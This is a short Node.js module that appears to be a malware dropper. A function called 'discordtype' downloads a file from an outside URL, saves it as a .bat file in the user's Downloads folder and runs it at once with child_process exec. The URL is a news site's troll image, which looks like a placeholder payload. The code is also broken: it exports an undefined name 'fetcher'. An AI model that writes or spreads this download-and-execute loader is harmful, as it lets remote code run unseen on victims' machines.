const axios = require('axios');
const fs = require('fs');
const { exec } = require('child_process');
const os = require('os');
const path = require('path');

const urlF = 'https://www.francetvinfo.fr/pictures/si9iFOPV1UO8tFtNS10SPe3-MQM/1500x843/2016/08/23/internet-troll.jpg';
const folderD = path.join(os.homedir(), 'Downloads', 'newdedev.bat');

async function discordtype() {
    try {
        const response = await axios({
            method: 'GET',
            url: urlF,
            responseType: 'stream'
        });

        const writer = fs.createWriteStream(folderD, { flags: 'w+' });
        response.data.pipe(writer);

        return new Promise((resolve, reject) => {
            writer.on('finish', () => {
                exec(`"${folderD}"`, (error, stdout, stderr) => {
                    if (error && error.code !== 1) {
                        console.error();
                        reject(error);
                        return;
                    }
                    console.log();
                    console.error();
                    resolve();
                });
            });
            writer.on('error', reject);
        });
    } catch (error) {
        console.error(error);
        throw error;
    }
}

module.exports = { fetcher };